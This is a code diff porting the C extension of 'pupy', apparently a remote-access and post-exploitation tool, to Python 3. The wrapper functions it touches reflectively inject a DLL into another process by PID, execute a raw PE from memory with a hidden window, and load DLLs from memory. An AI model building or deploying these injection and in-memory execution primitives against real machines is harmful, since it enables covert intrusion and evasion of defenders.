@@ -7,16 +7,16 @@
 
 #ifdef _PUPY_DYNLOAD
 #include <Python.h>
+#include "pupy_pyd.h"
 #else
 #include "Python-dynload.h"
+#include "pupy_load.h"
 #endif
 
 #include "debug.h"
 #include "MyLoadLibrary.h"
 #include "base_inject.h"
 #include "in-mem-exe.c"
-
-#include "pupy_load.h"
 
 static char module_doc[] = DOC("Builtins utilities for pupy");
 
@@ -76,7 +76,12 @@ static PyObject *Py_get_arch(PyObject *self, PyObject *args)
 
 static PyObject *Py_mexec(PyObject *self, PyObject *args) {
         PROCESS_INFORMATION pi;
-        STARTUPINFO si;
+#if PYMAJ > 2
+        STARTUPINFOW si;
+#else
+        STARTUPINFOA si;
+#endif
+
         SECURITY_ATTRIBUTES saAttr = {
                 sizeof(SECURITY_ATTRIBUTES),
                 NULL,
@@ -122,15 +127,21 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
                 return NULL;
 #endif
 
-        if (!(PyUnicode_Check(py_cmdline) || PyString_Check(py_cmdline))) {
+        if (!(PyUnicode_Check(py_cmdline) || PyBytes_Check(py_cmdline))) {
                 return PyErr_Format(
                         PyExc_Exception, "cmdline must be either str or unicode"
                 );
         }
 
-        memset(&si,0,sizeof(STARTUPINFO));
+#if PYMAJ > 2
+        memset(&si,0,sizeof(STARTUPINFOW));
         memset(&pi,0,sizeof(PROCESS_INFORMATION));
-        si.cb = sizeof(STARTUPINFO);
+        si.cb = sizeof(STARTUPINFOW);
+#else
+        memset(&si,0,sizeof(STARTUPINFOW));
+        memset(&pi,0,sizeof(PROCESS_INFORMATION));
+        si.cb = sizeof(STARTUPINFOW);
+#endif
 
         if(py_hidden && PyObject_IsTrue(py_hidden)){
                 si.dwFlags |= STARTF_USESHOWWINDOW;
@@ -174,15 +185,17 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
                                 createFlags, NULL, NULL, &si, &pi
                         );
                         free(tmpstr);
-                } else {
-                        dprint("Py_mexec::char cmdline\n");
-
+                }
+#if PYMAJ < 3
+                else {
                         blCreated = CreateProcessA(
                                 NULL, PyString_AsString(py_cmdline),
                                 &saAttr, NULL, inherit,
                                 createFlags, NULL, NULL, &si, &pi
                         );
+                        dprint("Py_mexec::char cmdline\n");
                 }
+#endif
 
                 if(!blCreated) {
                         CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
@@ -212,13 +225,15 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
                                 NULL, inherit, createFlags, NULL, NULL, &si, &pi
                         );
                         free(tmpstr);
-                } else {
+                }
+#if PYMAJ < 3
+                else {
                         blCreated = CreateProcessAsUserA(
                                 dupHandle, NULL, PyString_AsString(py_cmdline), &saAttr,
                                 NULL, inherit, createFlags, NULL, NULL, &si, &pi
                         );
                 }
-
+#endif
                 if (!blCreated) {
                         CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
                         CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
@@ -272,18 +287,25 @@ static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
         const char *cpCommandLine;
         PyObject* py_is64bit;
         int is64bits;
-        if (!PyArg_ParseTuple(args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
-                return NULL;
+
+        if (!PyArg_ParseTuple(
+                args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
+            return NULL;
+
         is64bits = PyObject_IsTrue(py_is64bit);
-        if(is64bits){
-                is64bits=PROCESS_ARCH_X64;
-        }else{
-                is64bits=PROCESS_ARCH_X86;
-        }
-        if(inject_dll( dwPid, lpDllBuffer, dwDllLenght, NULL, is64bits) != ERROR_SUCCESS)
-                return NULL;
+
+        if(is64bits)
+            is64bits = PROCESS_ARCH_X64;
+        else
+            is64bits = PROCESS_ARCH_X86;
+
+        if(inject_dll(
+               dwPid, lpDllBuffer, dwDllLenght, NULL, is64bits) != ERROR_SUCCESS)
+            return NULL;
+
         return PyBool_FromLong(1);
 }
+
 
 static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 {
@@ -298,6 +320,7 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
         return PyLong_FromVoidPtr(MyLoadLibrary(dllname, lpDllBuffer, NULL));
 }
 
+
 static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
 {
         const char *lpDllName = NULL;
@@ -311,10 +334,12 @@ static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
         return PyLong_FromVoidPtr(address);
 }
 
+
 static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
 {
         return PyBool_FromLong(is_shared);
 }
+
 
 static PyObject *Py_set_is_shared_object(PyObject *self, PyObject *arg0)
 {
@@ -324,9 +349,11 @@ static PyObject *Py_set_is_shared_object(PyObject *self, PyObject *arg0)
         return PyBool_FromLong(is_shared);
 }
 
+
 static PyObject *
 import_module(PyObject *self, PyObject *args)
 {
+        PyObject *spec;
         char *data;
         int size;
         char *initfuncname;
@@ -340,8 +367,9 @@ import_module(PyObject *self, PyObject *args)
         char *oldcontext;
 
         /* code, initfuncname, fqmodulename, path */
-        if (!PyArg_ParseTuple(args, "s#sss:import_module",
+        if (!PyArg_ParseTuple(args, "s#Osss:import_module",
                               &data, &size,
+                              &spec,
                               &initfuncname, &modname, &pathname))
                 return NULL;
 
@@ -369,51 +397,94 @@ import_module(PyObject *self, PyObject *args)
                 return NULL;
         }
 
-    oldcontext = _Py_PackageContext;
-
-        _Py_PackageContext = modname;
-        do_init();
-        _Py_PackageContext = oldcontext;
-
-        if (PyErr_Occurred())
-                return NULL;
-
-        /* Retrieve from sys.modules */
-        return PyImport_ImportModule(modname);
+        return PyInit_Module(spec, modname, do_init);
 }
 
+
 static PyMethodDef methods[] = {
-        { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
-        { "_set_shared", Py_set_is_shared_object, METH_NOARGS, DOC("") },
-        { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
-        { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS,
-         DOC("reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure") },
-        { "mexec", Py_mexec, METH_VARARGS|METH_KEYWORDS, DOC("mexec(cmdline, raw_pe, redirected_stdio=True, hidden=True)") },
-        { "import_module", import_module, METH_VARARGS,
-          "import_module(data, size, initfuncname, path) -> module" },
-        { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
-        { "set_exit_session_callback", Py_set_exit_session_callback, METH_VARARGS, DOC("set_exit_session_callback(function)")},
-        { "find_function_address", Py_find_function_address, METH_VARARGS,
-          DOC("find_function_address(dllname, function) -> address") },
-        { NULL, NULL },         /* Sentinel */
+        {
+            "is_shared", Py_is_shared_object,
+            METH_NOARGS, DOC("Client is shared object")
+        }, {
+            "_set_shared", Py_set_is_shared_object,
+            METH_NOARGS, DOC("")
+        }, {
+            "get_arch", Py_get_arch, METH_NOARGS,
+            DOC("get current pupy architecture (x86 or x64)")
+        }, {
+            "reflective_inject_dll", Py_reflective_inject_dll,
+            METH_VARARGS|METH_KEYWORDS,
+            DOC(
+                "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\n"
+                "reflectively inject a dll into a process. raise an Exception on failure"
+            )
+        }, {
+            "mexec", Py_mexec, METH_VARARGS|METH_KEYWORDS,
+            DOC("mexec(cmdline, raw_pe, redirected_stdio=True, hidden=True)")
+        }, {
+            "import_module", import_module, METH_VARARGS,
+            "import_module(data, size, initfuncname, path) -> module"
+        }, {
+            "load_dll", Py_load_dll, METH_VARARGS,
+            DOC("load_dll(dllname, raw_dll) -> ptr")
+        }, {
+            "set_exit_session_callback", Py_set_exit_session_callback,
+            METH_VARARGS, DOC("set_exit_session_callback(function)")
+        }, {
+            "find_function_address", Py_find_function_address, METH_VARARGS,
+            DOC("find_function_address(dllname, function) -> address")
+        }, {
+             /* Sentinel */
+            NULL, NULL
+        }
 };
 
-BOOL init_pupy(void)
+
+#if PYMAJ > 2
+static struct PyModuleDef pupy_moduledef = {
+    PyModuleDef_HEAD_INIT,
+    "_pupy", module_doc, -1, methods,
+    NULL, NULL, NULL, NULL,
+};
+#endif
+
+
+#if PYMAJ > 2
+PyObject* PyInit__pupy()
+#else
+void init_pupy(void)
+#endif
 {
-        PyObject *pupy = Py_InitModule3("_pupy", methods, module_doc);
-        if (!pupy) {
-                return FALSE;
-        }
+    PyObject *pupy = NULL;
 
-        PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
-        ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
-        Py_INCREF(ExecError);
-        PyModule_AddObject(pupy, "error", ExecError);
+#if PYMAJ > 2
+    pupy = PyModule_Create(&pupy_moduledef);
+#else
+    pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
+#endif
 
-        return TRUE;
+    if (!pupy) {
+#if PYMAJ > 2
+        return NULL;
+#else
+        return;
+#endif
+    }
+
+    PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
+    ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
+    Py_INCREF(ExecError);
+    PyModule_AddObject(pupy, "error", ExecError);
+
+#if PYMAJ > 2
+    return pupy;
+#endif
 }
 
 #ifdef _PUPY_DYNLOAD
+// Compatibility code
+#include "Python-dynload-compat.c"
+
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 {
     DWORD threadId;
@@ -443,8 +514,13 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 
                 args->cbExit = on_exit_session;
                 args->blInitialized = TRUE;
+#if PYMAJ > 2
+                args->pInit = PyInit__pupy;
+#else
+                args->pInit = init_pupy;
+#endif
             }
-            return init_pupy();
+            return TRUE;
 
         case DLL_THREAD_DETACH:
             break;
